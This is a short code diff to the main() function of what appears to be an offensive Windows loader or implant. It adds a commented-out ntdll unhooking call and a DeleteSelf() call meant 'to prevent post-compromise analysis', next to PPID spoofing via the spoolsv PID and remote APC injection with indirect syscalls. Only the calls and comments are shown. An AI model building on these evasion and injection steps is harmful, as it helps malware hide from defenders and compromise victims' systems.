@@ -15,6 +15,9 @@ int main()
     // APC execution
 
 
+    // Create a fresh copy of the ntdll library from file to unhook functions
+    // unhooking();
+
 
 
     // Get spoolsv PID for PPID spoofing
@@ -40,4 +43,9 @@ int main()
 
     // For APC execution in a remote process with indirect syscalls
     IndirectRemoteAPC(pid);
+
+
+
+    // For self-deletion to prevent post-compromise analysis
+    DeleteSelf();
 }
